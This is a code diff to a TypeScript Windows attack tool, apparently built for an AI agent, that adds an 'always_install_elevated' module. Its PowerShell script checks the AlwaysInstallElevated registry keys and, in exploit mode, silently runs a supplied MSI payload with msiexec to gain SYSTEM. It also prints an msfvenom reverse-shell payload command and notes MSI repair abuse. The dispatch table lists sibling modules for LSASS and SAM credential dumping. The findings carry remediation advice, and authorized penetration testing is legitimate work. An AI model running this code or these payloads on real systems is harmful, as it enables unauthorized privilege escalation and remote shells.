@@ -414,6 +414,10 @@ named_pipe_privesc: {
     description: "Named pipe impersonation for SYSTEM privilege escalation — create a named pipe server, trick a SYSTEM-level process into connecting, then impersonate its token. Covers PrintSpooler pipe, EfsRpc pipe, custom pipe + scheduled task trigger, and SeImpersonatePrivilege token theft",
     args: "--action enum|exploit [--pipe PIPE_NAME] [--method spooler|efsrpc|task|custom]",
   },
+always_install_elevated: {
+    description: "Check and exploit AlwaysInstallElevated policy — when both HKLM and HKCU registry keys are set to 1, any user can install MSI packages with SYSTEM privileges. Optionally run a payload MSI for instant privilege escalation",
+    args: "--action check|exploit [--payload MSI_PATH]",
+  },
 } as const satisfies Record<string, { description: string; args: string }>
 
 type Program = keyof typeof PROGRAMS
@@ -14454,6 +14458,106 @@ if ($result) {
   return { output: output.join("\n"), findings }
 }
 
+async function alwaysInstallElevated(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "check"
+  const payload = argVal(args, "--payload")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] AlwaysInstallElevated check...\n"]
+
+  const script = `
+# Check both registry keys
+$hklmKey = "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer"
+$hkcuKey = "HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer"
+
+$hklmValue = $null
+$hkcuValue = $null
+
+try {
+    $hklmValue = (Get-ItemProperty $hklmKey -Name AlwaysInstallElevated -ErrorAction Stop).AlwaysInstallElevated
+} catch {
+    Write-Output "[-] HKLM AlwaysInstallElevated: NOT SET (not vulnerable)"
+}
+
+try {
+    $hkcuValue = (Get-ItemProperty $hkcuKey -Name AlwaysInstallElevated -ErrorAction Stop).AlwaysInstallElevated
+} catch {
+    Write-Output "[-] HKCU AlwaysInstallElevated: NOT SET (not vulnerable)"
+}
+
+if ($hklmValue -ne $null) { Write-Output "[*] HKLM AlwaysInstallElevated = $hklmValue" }
+if ($hkcuValue -ne $null) { Write-Output "[*] HKCU AlwaysInstallElevated = $hkcuValue" }
+
+$vulnerable = ($hklmValue -eq 1) -and ($hkcuValue -eq 1)
+
+if ($vulnerable) {
+    Write-Output ""
+    Write-Output "[+] VULNERABLE — Both HKLM and HKCU AlwaysInstallElevated = 1"
+    Write-Output "[+] Any user can install MSI packages with SYSTEM privileges"
+    Write-Output "[+] Exploit: msiexec /quiet /qn /i payload.msi"
+    Write-Output ""
+    Write-Output "[*] Generate payload MSI with:"
+    Write-Output "    msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi -o payload.msi"
+    Write-Output "    or use a custom MSI with embedded commands"
+} else {
+    Write-Output ""
+    Write-Output "[-] Not vulnerable — AlwaysInstallElevated not enabled on both hives"
+}
+
+${action === "exploit" && payload ? `
+# Exploit mode
+if ($vulnerable) {
+    Write-Output ""
+    Write-Output "[*] Executing MSI payload: ${payload}"
+    $proc = Start-Process msiexec -ArgumentList "/quiet /qn /i `"${payload}`"" -Wait -PassThru -ErrorAction Stop
+    Write-Output "[+] MSI executed with exit code: $($proc.ExitCode)"
+    Write-Output "[+] Payload should have run as SYSTEM"
+} else {
+    Write-Output "[!] Cannot exploit — AlwaysInstallElevated not enabled"
+}
+` : ''}
+
+# Also check Windows Installer service configuration
+Write-Output ""
+Write-Output "=== Windows Installer Service ==="
+$msiSvc = Get-Service msiserver -ErrorAction SilentlyContinue
+if ($msiSvc) {
+    Write-Output "[*] Service: $($msiSvc.Status) (StartType: $($msiSvc.StartType))"
+} else {
+    Write-Output "[-] Windows Installer service not found"
+}
+
+# Check for MSI repair abuse (repair runs as SYSTEM even without AlwaysInstallElevated)
+Write-Output ""
+Write-Output "=== Installed MSI Products (repair abuse) ==="
+$products = Get-CimInstance Win32_Product -ErrorAction SilentlyContinue | Select-Object -First 10
+if ($products) {
+    Write-Output "[*] First 10 installed MSI products (msiexec /fa GUID runs repair as SYSTEM):"
+    foreach ($p in $products) {
+        Write-Output "    $($p.Name) — $($p.IdentifyingNumber)"
+    }
+} else {
+    Write-Output "[-] No MSI products enumerated (WMI may be slow)"
+}
+`
+  const result = await ps(script, timeout)
+  output.push(result.stdout)
+
+  if (result.stdout.includes("VULNERABLE")) {
+    findings.push({
+      checkId: "WIN-PRIVESC-AIE-001",
+      provider: "windows",
+      severity: "critical",
+      status: action === "exploit" && payload ? "EXPLOITED" : "VULNERABLE",
+      resource: "policy://always-install-elevated",
+      title: "AlwaysInstallElevated enabled — any user can install MSI as SYSTEM",
+      details: "Both HKLM and HKCU AlwaysInstallElevated registry keys are set to 1. Any MSI package will install with SYSTEM privileges.",
+      remediation: "Set AlwaysInstallElevated to 0 in both HKLM and HKCU. Remove via Group Policy: Computer Configuration > Administrative Templates > Windows Components > Windows Installer.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 const dispatch: Record<Program, (args: string[], timeout: number) => Promise<HookResult>> = {
   lsass_dump: lsassDump,
   sam_dump: samDump,
@@ -14538,6 +14642,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   privilege_abuse: privilegeAbuse,
   stored_creds_abuse: storedCredsAbuse,
   named_pipe_privesc: namedPipePrivesc,
+  always_install_elevated: alwaysInstallElevated,
 }
 
 export const WinhookTool = Tool.define("winhook", {
